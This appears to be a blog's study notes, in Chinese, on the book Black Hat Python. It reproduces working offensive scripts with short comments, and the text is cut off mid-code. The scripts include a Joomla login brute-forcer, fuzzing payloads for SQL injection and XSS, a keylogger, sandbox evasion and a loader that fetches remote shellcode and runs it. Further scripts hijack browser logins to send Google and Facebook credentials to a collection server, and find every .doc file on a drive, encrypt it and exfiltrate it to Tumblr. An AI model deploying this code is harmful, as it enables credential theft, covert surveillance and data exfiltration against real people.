urllib.requestthreads = 50target_url = &quot;http://testphp.vulnweb.com&quot;wordlist_file = &quot;all.txt&quot;  # from SVNDiggerresume = Noneuser_agent = &quot;Mozilla/5.0 (X11; Linux x86_64; rv:19.0) &quot; \\             &quot;Gecko/20100101 &quot; \\             &quot;Firefox/19.0&quot;def build_wordlist(wordlst_file):    # read in the word list    fd = open(wordlst_file, &quot;r&quot;)    raw_words = [line.rstrip(&#x27;\\n&#x27;) for line in fd]    fd.close()    found_resume = False    words = queue.Queue()    for word in raw_words:        if resume:            if found_resume:                words.put(word)            else:                if word == resume:                    found_resume = True                    print(&quot;Resuming wordlist from: %s&quot; % resume)        else:            words.put(word)    return wordsdef dir_bruter(extensions=None):    while not word_queue.empty():        attempt = word_queue.get()        attempt_list = []        # check if there is a file extension if not        # it&#x27;s a directory path we&#x27;re bruting        if &quot;.&quot; not in attempt:            attempt_list.append(&quot;/%s/&quot; % attempt)        else:            attempt_list.append(&quot;/%s&quot; % attempt)        # if we want to bruteforce extensions        if extensions:            for extension in extensions:                attempt_list.append(&quot;/%s%s&quot; % (attempt, extension))        # iterate over our list of attempts                for brute in attempt_list:            url = &quot;%s%s&quot; % (target_url, urllib.parse.quote(brute))            try:                headers = &#123;&quot;User-Agent&quot;: user_agent&#125;                r = urllib.request.Request(url, headers=headers)                response = urllib.request.urlopen(r)                if len(response.read()):                    print(&quot;[%d] =&gt; %s&quot; % (response.code, url))            except urllib.error.HTTPError as e:                if e.code != 404:                    print(&quot;!!! %d =&gt; %s&quot; % (e.code, url))                password_queue = build_wordlist(wordlist_file)file_extensions = [&quot;.php&quot;, &quot;.bak&quot;, &quot;.orig&quot;, &quot;.inc&quot;]for i in range(threads):    t = threading.Thread(target=dir_bruter, args=(file_extensions,))    t.start()\n程式本身不難懂，不過那個resume就有點怪怪的\nresume是如果有中斷的話，可以從這邊開始\n\nweb_app_mapper.py\nimport osimport queueimport threadingimport urllib.errorimport urllib.parseimport urllib.requestthreads = 10target = &quot;http://www.test.com&quot;directory = &quot;/Users/justin/Downloads/joomla-3.1.1&quot;filters = [&quot;.jpg&quot;, &quot;.gif&quot;, &quot;png&quot;, &quot;.css&quot;]os.chdir(directory)web_paths = queue.Queue()for r, d, f in os.walk(&quot;.&quot;):    for files in f:        remote_path = &quot;%s/%s&quot; % (r, files)        if remote_path.startswith(&quot;.&quot;):            remote_path = remote_path[1:]        if os.path.splitext(files)[1] not in filters:            web_paths.put(remote_path)def test_remote():    while not web_paths.empty():        path = web_paths.get()        url = &quot;%s%s&quot; % (target, path)        request = urllib.request.Request(url)        try:            response = urllib.request.urlopen(request)            print(&quot;[%d] =&gt; %s&quot; % (response.code, path))            response.close()        except urllib.error.HTTPError as error:            print(&quot;Failed %s&quot; % error.code)            passfor i in range(threads):    print(&quot;Spawning thread: %d&quot; % i)    t = threading.Thread(target=test_remote)    t.start()\n與上面的程式一樣是暴力法，但是list的來源一個是字典檔，這個是下載回來的檔案(ex:joomla)\n小總結: 生出有單字的queue -&gt; 讓thread發request去戳 -&gt; 看有沒有成功\n\njoomla_killer.py\nimport http.cookiejarimport queueimport threadingimport urllib.errorimport urllib.parseimport urllib.requestfrom abc import ABCfrom html.parser import HTMLParser# general settingsuser_thread = 10username = &quot;admin&quot;wordlist_file = &quot;cain.txt&quot;resume = None# target specific settingstarget_url = &quot;http://192.168.112.131/administrator/index.php&quot;target_post = &quot;http://192.168.112.131/administrator/index.php&quot;username_field = &quot;username&quot;password_field = &quot;passwd&quot;success_check = &quot;Administration - Control Panel&quot;class BruteParser(HTMLParser, ABC):    def __init__(self):        HTMLParser.__init__(self)        self.tag_results = &#123;&#125;    def handle_starttag(self, tag, attrs):        if tag == &quot;input&quot;:            tag_name = None            for name, value in attrs:                if name == &quot;name&quot;:                    tag_name = value                if tag_name:                    self.tag_results[tag_name] = valueclass Bruter(object):    def __init__(self, user, words_q):        self.username = user        self.password_q = words_q        self.found = False        print(&quot;Finished setting up for: %s&quot; % user)    def run_bruteforce(self):        for i in range(user_thread):            t = threading.Thread(target=self.web_bruter)            t.start()    def web_bruter(self):        while not self.password_q.empty() and not self.found:            brute = self.password_q.get().rstrip()            jar = http.cookiejar.FileCookieJar(&quot;cookies&quot;)            opener = urllib.request.build_opener(                urllib.request.HTTPCookieProcessor(jar))            response = opener.open(target_url)            page = response.read()            print(&quot;Trying: %s : %s (%d left)&quot; % (                self.username, brute, self.password_q.qsize()))            # parse out the hidden fields            parser = BruteParser()            parser.feed(page)            post_tags = parser.tag_results            # add our username and password fields            post_tags[username_field] = self.username            post_tags[password_field] = brute            login_data = urllib.parse.urlencode(post_tags)            login_response = opener.open(target_post, login_data) #這樣就可以丟post!!            login_result = login_response.read()            if success_check in login_result:                self.found = True                print(&quot;[*] Bruteforce successful.&quot;)                print(&quot;[*] Username: %s&quot; % username)                print(&quot;[*] Password: %s&quot; % brute)                print(&quot;[*] Waiting for other threads to exit...&quot;)def build_wordlist(wordlst_file):    # read in the word list    fd = open(wordlst_file, &quot;r&quot;)    raw_words = [line.rstrip(&#x27;\\n&#x27;) for line in fd]    fd.close()    found_resume = False    word_queue = queue.Queue()    for word in raw_words:        word = word.rstrip()        if resume is not None:            if found_resume:                word_queue.put(word)            else:                if word == resume:                    found_resume = True                    print(&quot;Resuming wordlist from: %s&quot; % resume)        else:            word_queue.put(word)    return word_queuewords = build_wordlist(wordlist_file)bruter_obj = Bruter(username, words)bruter_obj.run_bruteforce()\n\n這裡是要送post的form，要替所有input都填上值，再用post打出去\n不過那個opener用起來感覺不太直覺啊\nCH6\n準備好jython的jar，之後就可以在burp加入自己的功能了\n但說老實的，我沒用過burp阿\n之後應該用用burp，並記錄下來。\nbhp_bing.py\nimport base64import jsonimport reimport socketimport urllib.errorimport urllib.parseimport urllib.requestfrom burp import IBurpExtenderfrom burp import IContextMenuFactoryfrom java.net import URLfrom java.util import ArrayListfrom javax.swing import JMenuItembing_api_key = &quot;YOURKEYHERE&quot;class BurpExtender(IBurpExtender, IContextMenuFactory):    # implements    def registerExtenderCallbacks(self, callbacks):        self._callbacks = callbacks        self._helpers = callbacks.getHelpers()        self.context = None        # we set up our extension        callbacks.setExtensionName(&quot;BHP Bing&quot;)        callbacks.registerContextMenuFactory(self)        return    # implements    def createMenuItems(self, context_menu):        self.context = context_menu        menu_list = ArrayList()        menu_list.add(JMenuItem(&quot;Send to Bing&quot;, actionPerformed=self.bing_menu))        return menu_list    def bing_menu(self, event):        # grab the details of what the user clicked        http_traffic = self.context.getSelectedMessages()        print(&quot;%d requests highlighted&quot; % len(http_traffic))        for traffic in http_traffic:            http_service = traffic.getHttpService()            host = http_service.getHost()            print(&quot;User selected host: %s&quot; % host)            self.bing_search(host)        return    def bing_search(self, host):        # check if we have an IP or hostname        is_ip = re.match(r&#x27;[0-9]+(?:\\.[0-9]+)&#123;3&#125;&#x27;, host)        if is_ip:            ip_address = host            domain = False        else:            ip_address = socket.gethostbyname(host)            domain = True        bing_query_string = &quot;&#x27;ip:%s&#x27;&quot; % ip_address        self.bing_query(bing_query_string)        if domain:            bing_query_string = &quot;&#x27;domain:%s&#x27;&quot; % host            self.bing_query(bing_query_string)    def bing_query(self, bing_query_string):        print(&quot;Performing Bing search: %s&quot; % bing_query_string)        # encode our query        quoted_query = urllib.parse.quote(bing_query_string)        http_request = &quot;GET https://api.datamarket.azure.com/Bing/Search/Web?$format=json&amp;$top=20&amp;Query=%s HTTP/1.1\\r\\n&quot; % quoted_query        http_request += &quot;Host: api.datamarket.azure.com\\r\\n&quot;        http_request += &quot;Connection: close\\r\\n&quot;        http_request += &quot;Authorization: Basic %s\\r\\n&quot; % base64.b64encode(            &quot;:%s&quot; % bing_api_key)        http_request += &quot;User-Agent: Blackhat Python\\r\\n\\r\\n&quot;        json_body = self._callbacks.makeHttpRequest(&quot;api.datamarket.azure.com&quot;,                                                    443, True,                                                    http_request).tostring()        json_body = json_body.split(&quot;\\r\\n\\r\\n&quot;, 1)[1]        try:            r = json.loads(json_body)            if len(r[&quot;d&quot;][&quot;results&quot;]):                for site in r[&quot;d&quot;][&quot;results&quot;]:                    print(&quot;*&quot; * 100)                    print(site[&#x27;Title&#x27;])                    print(site[&#x27;Url&#x27;])                    print(site[&#x27;Description&#x27;])                    print(&quot;*&quot; * 100)                    j_url = URL(site[&#x27;Url&#x27;])                    if not self._callbacks.isInScope(j_url):                        print(&quot;Adding to Burp scope&quot;)                        self._callbacks.includeInScope(j_url)        except:            print(&quot;No results from Bing&quot;)            pass        return\n從第一個網址開始，透過bing去找出其他相關的加入burp，來擴大搜尋範圍\n\nbhp_fuzzer.py\nfrom burp import IBurpExtenderfrom burp import IIntruderPayloadGeneratorFactoryfrom burp import IIntruderPayloadGeneratorfrom java.util import List, ArrayListimport randomclass BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):    # implements    def registerExtenderCallbacks(self, callbacks):        self._callbacks = callbacks        self._helpers = callbacks.getHelpers()        callbacks.registerIntruderPayloadGeneratorFactory(self)        return    # implements    @staticmethod    def getGeneratorName():        return &quot;BHP Payload Generator&quot;    # implements    def createNewInstance(self, attack):        return BHPFuzzer(self, attack)class BHPFuzzer(IIntruderPayloadGenerator):    def __init__(self, extender, attack):        self._extender = extender        self._helpers = extender._helpers        self._attack = attack        print(&quot;BHP Fuzzer initialized&quot;)        self.max_payloads = 1000        self.num_payloads = 0        return    def hasMorePayloads(self):        print(&quot;hasMorePayloads called.&quot;)        if self.num_payloads == self.max_payloads:            print(&quot;No more payloads.&quot;)            return False        else:            print(&quot;More payloads. Continuing.&quot;)            return True    def getNextPayload(self, current_payload):        # convert into a string        payload = &quot;&quot;.join(chr(x) for x in current_payload)        # call our simple mutator to fuzz the POST        payload = self.mutate_payload(payload)        # increase the number of fuzzing attempts        self.num_payloads += 1        return payload    def reset(self):        self.num_payloads = 0        return    @staticmethod    def mutate_payload(original_payload):        # pick a simple mutator or even call an external script        # like Radamsa does        picker = random.randint(1, 3)        # select a random offset in the payload to mutate        offset = random.randint(0, len(original_payload) - 1)        payload = original_payload[:offset]        # random offset insert a SQL injection attempt        if picker == 1:            payload += &quot;&#x27;&quot;            # jam an XSS attempt in        if picker == 2:            payload += &quot;&lt;script&gt;alert(&#x27;BHP!&#x27;);&lt;/script&gt;&quot;            # repeat a chunk of the original payload a random number        if picker == 3:            chunk_length = random.randint(len(payload[offset:]),                                          len(payload) - 1)            repeater = random.randint(1, 10)            for i in range(repeater):                payload += original_payload[offset:offset + chunk_length]        # add the remaining bits of the payload        payload += original_payload[offset:]        return payload\n就是iterator，會隨機修改request\n\nbhp_wordlist.py\n#!/usr/bin/env python# -*- coding: utf-8 -*-from burp import IBurpExtenderfrom burp import IContextMenuFactoryfrom javax.swing import JMenuItemfrom java.util import List, ArrayListfrom java.net import URLimport refrom datetime import datetimefrom html.parser import HTMLParserclass TagStripper(HTMLParser):    def __init__(self):        HTMLParser.__init__(self)        self.page_text = []    def handle_data(self, data):        self.page_text.append(data)    def handle_comment(self, data):        self.handle_data(data)    def strip(self, html):        self.feed(html)        return &quot; &quot;.join(self.page_text)class BurpExtender(IBurpExtender, IContextMenuFactory):    def registerExtenderCallbacks(self, callbacks):        self._callbacks = callbacks        self._helpers = callbacks.getHelpers()        self.context = None        self.hosts = set()        # start with something we know is common        self.wordlist = &#123;&quot;password&quot;&#125;        # we set up our extension        callbacks.setExtensionName(&quot;BHP Wordlist&quot;)        callbacks.registerContextMenuFactory(self)        return    def createMenuItems(self, context_menu):        self.context = context_menu        menu_list = ArrayList()        menu_list.add(JMenuItem(&quot;Create Wordlist&quot;,                                actionPerformed=self.wordlist_menu))        return menu_list    def wordlist_menu(self, event):        # grab the details of what the user clicked        http_traffic = self.context.getSelectedMessages()        for traffic in http_traffic:            http_service = traffic.getHttpService()            host = http_service.getHost()            self.hosts.add(host)            http_response = traffic.getResponse()            if http_response:                self.get_words(http_response)        self.display_wordlist()        return    def get_words(self, http_response):        headers, body = http_response.tostring().split(&#x27;\\r\\n\\r\\n&#x27;, 1)        # skip non-text responses        if headers.lower().find(&quot;content-type: text&quot;) == -1:            return        tag_stripper = TagStripper()        page_text = tag_stripper.strip(body)        words = re.findall(r&#x27;[a-zA-Z]\\w&#123;2,&#125;&#x27;, page_text)        for word in words:            # filter out long strings            if len(word) &lt;= 12:                self.wordlist.add(word.lower())        return    @staticmethod    def mangle(word):        year = datetime.now().year        suffixes = [&quot;&quot;, &quot;1&quot;, &quot;!&quot;, year]        mangled = []        for password in (word, word.capitalize()):            for suffix in suffixes:                mangled.append(&quot;%s%s&quot; % (password, suffix))        return mangled    def display_wordlist(self):        print(&quot;# BHP Wordlist for site(s) %s&quot; % &quot;, &quot;.join(self.hosts))        for word in sorted(self.wordlist):            for password in self.mangle(word):                print(password)        return\n就是從request的text中撈出word，塞到wordlist\n","categories":["Python","Reading"]},{"title":"blackhat python - windows","url":"/2020/9/python-black-hat-windows/","content":"動機\n這是對我來說最hardcore的部分\n都沒接觸過啊\nwindows system programming\nmemory forensics\ncode injection (binary &amp; shell code)\n超hardcode\n\nCH8\n主要是讓大家看看ctypes與pyhook的操作\n\nctypes is a foreign function library for Python.\nIt provides C compatible data types, and allows calling functions in DLLs or shared libraries.\nIt can be used to wrap these libraries in pure Python.\n\n\nThe pyHook package provides callbacks for global mouse and keyboard events in Windows.\nPython applications register event handlers for user input events such as left mouse down, left mouse up, key down, etc. and set the keyboard and/or mouse hook\n\nkeylogger.py\nfrom ctypes import *import pythoncomimport pyHookimport win32clipboarduser32 = windll.user32kernel32 = windll.kernel32psapi = windll.psapicurrent_window = Nonedef get_current_process():    # get a handle to the foreground window    hwnd = user32.GetForegroundWindow()    # find the process ID    pid = c_ulong(0)    user32.GetWindowThreadProcessId(hwnd, byref(pid))    # store the current process ID    process_id = &quot;%d&quot; % pid.value    # grab the executable    executable = create_string_buffer(b&#x27;\\x00&#x27; * 512)    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)    # now read it&#x27;s title    window_title = create_string_buffer(b&#x27;\\x00&#x27; * 512)    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)    # print out the header if we&#x27;re in the right process    print()    print(&quot;[ PID: %s - %s - %s ]&quot; % (process_id,                                     executable.value,                                     window_title.value)          )    print()    # close handles    kernel32.CloseHandle(hwnd)    kernel32.CloseHandle(h_process)def KeyStroke(event):    global current_window    # check to see if target changed windows    if event.WindowName != current_window:        current_window = event.WindowName        get_current_process()    # if they pressed a standard key    if 32 &lt; event.Ascii &lt; 127:        print(chr(event.Ascii), end=&#x27; &#x27;)    else:        # if [Ctrl-V], get the value on the clipboard        # added by Dan Frisch 2014        if event.Key == &quot;V&quot;:            win32clipboard.OpenClipboard()            pasted_value = win32clipboard.GetClipboardData()            win32clipboard.CloseClipboard()            print(&quot;[PASTE] - %s&quot; % pasted_value, end=&#x27; &#x27;)        else:            print(&quot;[%s]&quot; % event.Key, end=&#x27; &#x27;)    # pass execution to next hook registered     return True# create and register a hook managerkl = pyHook.HookManager()kl.KeyDown = KeyStroke# register the hook and execute foreverkl.HookKeyboard()pythoncom.PumpMessages()\n就是掛callback這沒問題\n但要注意的是handler\n可以看成windows programming的參考(或是ptr)\n\nscreenshotter.py\nimport win32guiimport win32uiimport win32conimport win32api# grab a handle to the main desktop windowhdesktop = win32gui.GetDesktopWindow()# determine the size of all monitors in pixelswidth = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)# create a device contextdesktop_dc = win32gui.GetWindowDC(hdesktop)img_dc = win32ui.CreateDCFromHandle(desktop_dc)# create a memory based device contextmem_dc = img_dc.CreateCompatibleDC()# create a bitmap objectscreenshot = win32ui.CreateBitmap()screenshot.CreateCompatibleBitmap(img_dc, width, height)mem_dc.SelectObject(screenshot)# copy the screen into our memory device contextmem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)# save the bitmap to a filescreenshot.SaveBitmapFile(mem_dc, &#x27;c:\\\\WINDOWS\\\\Temp\\\\screenshot.bmp&#x27;)# free our objectsmem_dc.DeleteDC()win32gui.DeleteObject(screenshot.GetHandle())\nDevice Contexts(DC)就是呈現(或放置)圖像的地方\n這code有三個DC\n\ndesktop\nmemory(放圖的地方)\nbitmap(圖檔)\n\n詳細的Device Contexts要搭配GDI programming來看\n整個流程是\ndesktop -&gt; memory -&gt; bitmap -&gt; .bmp\n\nsandbox_detect.py\nimport ctypesimport randomimport timeimport sysuser32 = ctypes.windll.user32kernel32 = ctypes.windll.kernel32keystrokes = 0mouse_clicks = 0double_clicks = 0class LASTINPUTINFO(ctypes.Structure):    _fields_ = [(&quot;cbSize&quot;, ctypes.c_uint), (&quot;dwTime&quot;, ctypes.c_ulong)]def get_last_input():    struct_lastinputinfo = LASTINPUTINFO()    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)    # get last input registered    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))    # now determine how long the machine has been running    run_time = kernel32.GetTickCount()    elapsed = run_time - struct_lastinputinfo.dwTime    print(&quot;[*] It&#x27;s been %d milliseconds since the last input event.&quot; % elapsed)    return elapseddef get_key_press():    global mouse_clicks    global keystrokes    for i in range(0, 0xff):        if user32.GetAsyncKeyState(i) == -32767:            # 0x1 is the code for a left mouse click            if i == 1:                mouse_clicks += 1                return time.time()            else:                keystrokes += 1    return Nonedef detect_sandbox():    global mouse_clicks    global keystrokes    max_keystrokes = random.randint(10, 25)    max_mouse_clicks = random.randint(5, 25)    double_clicks = 0    max_double_clicks = 10    double_click_threshold = 0.250    first_double_click = None    average_mousetime = 0    max_input_threshold = 30000    previous_timestamp = None    detection_complete = False    last_input = get_last_input()    # if we hit our threshold let&#x27;s bail out    if last_input &gt;= max_input_threshold:        sys.exit(0)    while not detection_complete:        keypress_time = get_key_press()        if keypress_time is not None and previous_timestamp is not None:            # calculate the time between double clicks            elapsed = keypress_time - previous_timestamp            # the user double clicked            if elapsed &lt;= double_click_threshold:                double_clicks += 1                if first_double_click is None:                    # grab the timestamp of the first double click                    first_double_click = time.time()                else:                    # did they try to emulate a rapid succession of clicks?                       if double_clicks == max_double_clicks:                        if keypress_time - first_double_click &lt;= (                                max_double_clicks * double_click_threshold):                            sys.exit(0)            # we are happy there&#x27;s enough user input            if keystrokes &gt;= max_keystrokes \\                    and double_clicks &gt;= max_double_clicks \\                    and mouse_clicks &gt;= max_mouse_clicks:                return            previous_timestamp = keypress_time        elif keypress_time is not None:            previous_timestamp = keypress_timedetect_sandbox()print(&quot;We are ok!&quot;)\n用按鍵次數來判斷我們是不是在sanbox中，因為sandbox通常是自動化操作\n所以按鍵次數相對固定\n有趣的是這裡處理按鍵是用ctypes硬幹，其實也可以用pyhooks\n\nshell_exec.py\nimport base64import ctypesimport urllib.request# retrieve the shellcode from our web serverurl = &quot;http://localhost:8000/shellcode.bin&quot;response = urllib.request.urlopen(url)# decode the shellcode from base64 shellcode = base64.b64decode(response.read())# create a buffer in memoryshellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))# create a function pointer to our shellcodeshellcode_func = ctypes.cast(shellcode_buffer,                             ctypes.CFUNCTYPE(ctypes.c_void_p))# call our shellcodeshellcode_func()\n把bytes傳型成CFUNCTYPE來執行\n很有趣!!\n不過要怎麼產生.bin?\n參考CANVAS或是Metasploits\nCH9\nCLE automation??\nmitb.py\nimport timeimport urllib.parseimport win32com.clientdata_receiver = &quot;http://localhost:8080/&quot;target_sites = &#123;    &quot;www.facebook.com&quot;:        &#123;            &quot;logout_url&quot;: None,            &quot;logout_form&quot;: &quot;logout_form&quot;,            &quot;login_form_index&quot;: 0,            &quot;owned&quot;: False        &#125;,    &quot;accounts.google.com&quot;:        &#123;            &quot;logout_url&quot;: &quot;https://accounts.google.com/Logout?hl=en&amp;continue=&quot;                          &quot;https://accounts.google.com/&quot;                          &quot;ServiceLogin%3Fservice%3Dmail&quot;,            &quot;logout_form&quot;: None,            &quot;login_form_index&quot;: 0,            &quot;owned&quot;: False        &#125;&#125;target_sites[&quot;www.gmail.com&quot;] = target_sites[&quot;accounts.google.com&quot;]target_sites[&quot;mail.google.com&quot;] = target_sites[&quot;accounts.google.com&quot;]clsid = &#x27;&#123;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#125;&#x27;windows = win32com.client.Dispatch(clsid)def wait_for_browser(browser):    # wait for the browser to finish loading a page    while browser.ReadyState != 4 and browser.ReadyState != &quot;complete&quot;:        time.sleep(0.1)    returnwhile True:    for browser in windows:        url = urllib.parse.urlparse(browser.LocationUrl)        if url.hostname in target_sites:            if target_sites[url.hostname][&quot;owned&quot;]:                continue            # if there is a URL we can just redirect            if target_sites[url.hostname][&quot;logout_url&quot;]:                browser.Navigate(target_sites[url.hostname][&quot;logout_url&quot;])                wait_for_browser(browser)            else:                # retrieve all elements in the document                full_doc = browser.Document.all                # iterate looking for the logout form                for i in full_doc:                    try:                        # find the logout form and submit it                        if i.id == target_sites[url.hostname][&quot;logout_form&quot;]:                            i.submit()                            wait_for_browser(browser)                    except:                        pass            try:                # now we modify the login form                login_index = target_sites[url.hostname][&quot;login_form_index&quot;]                login_page = urllib.parse.quote(browser.LocationUrl)                browser.Document.forms[login_index].action = &quot;%s%s&quot; % (                    data_receiver, login_page)                target_sites[url.hostname][&quot;owned&quot;] = True            except:                pass        time.sleep(5)\n這邊的想法是，先把user給logout，再把登入的request傳送到自己的http server來顯示資料，在forward到原本的server\n這邊是攔截ie的資料，那要ie幫忙的方法就是OLE Automation\n就是\nclsid = &#x27;&#123;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#125;&#x27; # 可以當成程式在windows的是識別碼，就是座號啦# 如何拿clsid?# https://www.c-sharpcorner.com/blogs/how-to-find-clsid-of-a-dllwindows = win32com.client.Dispatch(clsid) # 註冊OLE automation\n這兩行做的事\n\nie_exfil.py\nimport win32com.clientimport osimport fnmatchimport timeimport randomimport zlibimport base64from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPdoc_type = &quot;.doc&quot;username = &quot;test@test.com&quot;password = &quot;testpassword&quot;public_key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5Tlak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+Th/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS1wIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;def wait_for_browser(browser):    # wait for the browser to finish loading a page    while browser.ReadyState != 4 and browser.ReadyState != &quot;complete&quot;:        time.sleep(0.1)    returndef encrypt_string(plaintext):    chunk_size = 208    if isinstance(plaintext, (str)):        plaintext = plaintext.encode()    print(&quot;Compressing: %d bytes&quot; % len(plaintext))    plaintext = zlib.compress(plaintext)    print(&quot;Encrypting %d bytes&quot; % len(plaintext))    rsakey = RSA.importKey(public_key)    rsakey = PKCS1_OAEP.new(rsakey)    encrypted = b&quot;&quot;    offset = 0    while offset &lt; len(plaintext):        chunk = plaintext[offset:offset + chunk_size]        if len(chunk) % chunk_size != 0:            chunk += b&quot; &quot; * (chunk_size - len(chunk))        encrypted += rsakey.encrypt(chunk)        offset += chunk_size    encrypted = base64.b64encode(encrypted)    print(&quot;Base64 encoded crypto: %d&quot; % len(encrypted))    return encrypteddef encrypt_post(filename):    # open and read the file    fd = open(filename, &quot;rb&quot;)    contents = fd.read()    fd.close()    encrypted_title = encrypt_string(filename)    encrypted_body = encrypt_string(contents)    return encrypted_title, encrypted_bodydef random_sleep():    time.sleep(random.randint(5, 10))    returndef login_to_tumblr(ie):    # retrieve all elements in the document    full_doc = ie.Document.all    # iterate looking for the logout form    for i in full_doc:        if i.id == &quot;signup_email&quot;:            i.setAttribute(&quot;value&quot;, username)        elif i.id == &quot;signup_password&quot;:            i.setAttribute(&quot;value&quot;, password)    random_sleep()    # you can be presented with different homepages    try:        if ie.Document.forms[0].id == &quot;signup_form&quot;:            ie.Document.forms[0].submit()        else:            ie.Document.forms[1].submit()    except IndexError:        pass    random_sleep()    # the login form is the second form on the page    wait_for_browser(ie)    returndef post_to_tumblr(ie, title, post):    full_doc = ie.Document.all    for i in full_doc:        if i.id == &quot;post_one&quot;:            i.setAttribute(&quot;value&quot;, title)            title_box = i            i.focus()        elif i.id == &quot;post_two&quot;:            i.setAttribute(&quot;innerHTML&quot;, post)            print(&quot;Set text area&quot;)            i.focus()        elif i.id == &quot;create_post&quot;:            print(&quot;Found post button&quot;)            post_form = i            i.focus()    # move focus away from the main content box            random_sleep()    title_box.focus()    random_sleep()    # post the form    post_form.children[0].click()    wait_for_browser(ie)    random_sleep()    returndef exfiltrate(document_path):    ie = win32com.client.Dispatch(&quot;InternetExplorer.Application&quot;)    ie.Visible = 1    # head to tumblr and login    ie.Navigate(&quot;http://www.tumblr.com/login&quot;)    wait_for_browser(ie)    print(&quot;Logging in...&quot;)    login_to_tumblr(ie)    print(&quot;Logged in...navigating&quot;)    ie.Navigate(&quot;https://www.tumblr.com/new/text&quot;)    wait_for_browser(ie)    # encrypt the file    title, body = encrypt_post(document_path)    print(&quot;Creating new post...&quot;)    post_to_tumblr(ie, title, body)    print(&quot;Posted!&quot;)    # Destroy the IE instance    ie.Quit()    ie = None    return# main loop for document discoveryfor parent, directories, filenames in os.walk(&quot;C:\\\\&quot;):    for filename in fnmatch.filter(filenames, &quot;*%s&quot; % doc_type):        document_path = os.path.join(parent, filename)        print(&quot;Found: %s&quot; % document_path)        exfiltrate(document_path)        input(&quot;Continue?&quot;)\n加密filepath，po到tumblr去\n\nkeygen.py &amp; decryptor.py\nimport zlibimport base64from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPnew_key = RSA.generate(2048)public_key = new_key.publickey().exportKey(&quot;PEM&quot;)private_key = new_key.exportKey(&quot;PEM&quot;) encrypted = &quot;&quot;&quot;XxfaX7nfQ48K...................G2V+2zuq6ol8Cs=&quot;&quot;&quot;private_key = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAyXUTgFoL/2EPKoN31l5Tlak7VxhdusNCWQKDfcN5Jj45GQ1o...................................vOGHt9D9yo3DOhyvJbedpi3u3g13G+FZFw6d1T8Jzm5eZUvG7WeUtg==-----END RSA PRIVATE KEY-----&quot;&quot;&quot;rsakey = RSA.importKey(private_key)rsakey = PKCS1_OAEP.new(rsakey)offset = 0decrypted = &quot;&quot;encrypted = base64.b64decode(encrypted)while offset &lt; len(encrypted):    decrypted += rsakey.decrypt(encrypted[offset:offset + 256])    offset += 256# now we decompress to originalplaintext = zlib.decompress(decrypted)print(plaintext)\n就是加解密，原本是兩個檔案，但因為這很好理解他們想幹嘛，同時又都不長，就合併在一起了\n\ncred_server.py\nimport http.serverimport socketserverimport urllib.errorimport urllib.parseimport urllib.requestclass CredRequestHandler(http.server.SimpleHTTPRequestHandler):    def do_POST(self):        content_length = int(self.headers[&#x27;Content-Length&#x27;])        creds = self.rfile.read(content_length).decode(&#x27;utf-8&#x27;)        print(creds)        site = self.path[1:]        self.send_response(301)        self.send_header(&#x27;Location&#x27;, urllib.parse.unquote(site))        self.end_headers()server = socketserver.TCPServer((&#x27;0.0.0.0&#x27;, 8080), CredRequestHandler)server.serve_forever()\n就是會顯示request的http server\nCH10\n這裡的目的是找出\n高權限process會使用的檔案，但其檔案可以被低權限的使用者取用的檔案\n以此繞過權限管制\n下面的兩個code就是分別\n\n找出高權限(有趣的)process\n當檔案被修改時插入我們的code\n\nprocess_monitor.py\nimport win32conimport win32apiimport win32securityimport wmiimport osLOG_FILE = &quot;process_monitor_log.csv&quot;def get_process_privileges(pid):    try:        # obtain a handle to the target process        hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION,                                     False,                                     pid)        # open the main process token        htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY)        # retrieve the list of privileges enabled        privs = win32security.GetTokenInformation(            htok,            win32security.TokenPrivileges)        # iterate over privileges and output the ones that are enabled        priv_list = []        for priv_id, priv_flags in privs:            # check if the privilege is enabled            if priv_flags == 3:                priv_list.append(                    win32security.LookupPrivilegeName(None, priv_id))    except:        priv_list.append(&quot;N/A&quot;)    return &quot;|&quot;.join(priv_list)def log_to_file(message):    fd = open(LOG_FILE, &quot;ab&quot;)    fd.write(&quot;%s\\r\\n&quot; % message)    fd.close()    return# create a log file headerif not os.path.isfile(LOG_FILE):    log_to_file(&quot;Time,User,Executable,CommandLine,PID,ParentPID,Privileges&quot;)# instantiate the WMI interfacec = wmi.WMI()# create our process monitorprocess_watcher = c.Win32_Process.watch_for(&quot;creation&quot;)while True:    try:        new_process = process_watcher()        proc_owner = new_process.GetOwner()        proc_owner = &quot;%s\\\\%s&quot; % (proc_owner[0], proc_owner[2])        create_date = new_process.CreationDate        executable = new_process.ExecutablePath        cmdline = new_process.CommandLine        pid = new_process.ProcessId        parent_pid = 